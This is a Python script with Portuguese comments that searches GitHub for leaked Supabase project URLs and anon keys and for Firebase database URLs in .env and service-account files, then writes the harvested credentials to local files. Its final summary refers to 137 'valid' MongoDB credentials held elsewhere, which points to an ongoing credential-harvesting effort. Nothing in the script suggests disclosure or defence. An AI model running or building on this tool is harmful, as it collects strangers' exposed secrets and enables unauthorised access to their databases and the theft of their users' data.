#!/usr/bin/env python3
"""
scrape-web.py — Busca credenciais via GitHub web search (sem auth).
Usa repositório search (não code search) + raw file download.
"""

import json
import re
import time
import urllib.request
import os

OUTPUT_SUPABASE = "scraped_supabase_creds.txt"
OUTPUT_FIREBASE = "scraped_firebase_creds.txt"

UA = "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 Chrome/120.0.0.0 Safari/537.36"

SUPABASE_URL_RE = re.compile(r'https?://([a-z0-9\-]+)\.supabase\.co')
SUPABASE_KEY_RE = re.compile(r'eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9\.[a-zA-Z0-9_\-]{20,}\.[a-zA-Z0-9_\-]{20,}')
FIREBASE_URL_RE = re.compile(r'https?://([a-z0-9\-]+)\.firebaseio\.com')


def fetch(url: str) -> str:
    req = urllib.request.Request(url, headers={"User-Agent": UA})
    try:
        with urllib.request.urlopen(req, timeout=10) as resp:
            return resp.read().decode("utf-8", errors="replace")
    except Exception as e:
        return ""


def search_repos(query: str, page: int = 1) -> list:
    """Busca repositórios via GitHub API (não precisa de auth para repo search)."""
    params = f"q={urllib.parse.quote(query)}&per_page=10&page={page}&sort=updated"
    url = f"https://api.github.com/search/repositories?{params}"
    req = urllib.request.Request(url, headers={
        "User-Agent": UA,
        "Accept": "application/vnd.github.v3+json",
    })
    try:
        with urllib.request.urlopen(req, timeout=10) as resp:
            data = json.loads(resp.read().decode("utf-8"))
            return data.get("items", [])
    except Exception as e:
        print(f"  [!] {e}")
        return []


import urllib.parse

def scrape_supabase():
    print("\n=== Buscando Supabase ===\n")

    # Estratégia: buscar .env files e configs de repos que usam supabase
    queries = [
        "NEXT_PUBLIC_SUPABASE_URL NEXT_PUBLIC_SUPABASE_ANON_KEY filename:.env",
        "supabase_url supabase_key filename:.env.local",
        "supabase createClient anon filename:.env",
    ]

    found = set()

    for q in queries:
        print(f"  [*] {q[:70]}...")

        # Buscar via GitHub web search (sem API code search)
        # Usando a busca de conteúdo HTML em github.com/search
        encoded = urllib.parse.quote(q)
        html = fetch(f"https://github.com/search?q={encoded}&type=code")

        # Procurar URLs e keys no HTML retornado
        urls = SUPABASE_URL_RE.findall(html)
        keys = SUPABASE_KEY_RE.findall(html)

        for u in urls:
            for k in keys:
                cred = f"https://{u}.supabase.co|{k}"
                if cred not in found:
                    found.add(cred)
                    print(f"  [FOUND] {u}.supabase.co")

        time.sleep(3)

    with open(OUTPUT_SUPABASE, "w") as f:
        f.write("# Supabase — url|anon_key\n")
        for c in found:
            f.write(c + "\n")

    print(f"\n  Total: {len(found)} → {OUTPUT_SUPABASE}")
    return found


def scrape_firebase():
    print("\n=== Buscando Firebase ===\n")

    queries = [
        "databaseURL firebaseio.com filename:.env",
        "firebase-adminsdk firebaseio.com filename:serviceAccount",
        "FIREBASE_URL firebaseio.com filename:.env",
    ]

    found = set()

    for q in queries:
        print(f"  [*] {q[:70]}...")
        encoded = urllib.parse.quote(q)
        html = fetch(f"https://github.com/search?q={encoded}&type=code")

        urls = FIREBASE_URL_RE.findall(html)
        for u in urls:
            full = f"https://{u}.firebaseio.com"
            if full not in found:
                found.add(full)
                print(f"  [FOUND] {u}.firebaseio.com")

        time.sleep(3)

    with open(OUTPUT_FIREBASE, "w") as f:
        f.write("# Firebase URLs\n")
        for u in found:
            f.write(u + "\n")

    print(f"\n  Total: {len(found)} → {OUTPUT_FIREBASE}")
    return found


if __name__ == "__main__":
    sb = scrape_supabase()
    fb = scrape_firebase()

    print("\n=== Resumo ===")
    print(f"  Supabase: {len(sb)}")
    print(f"  Firebase: {len(fb)}")
    print(f"  MongoDB:  137 (mongo_validos456.txt)")
    print("")
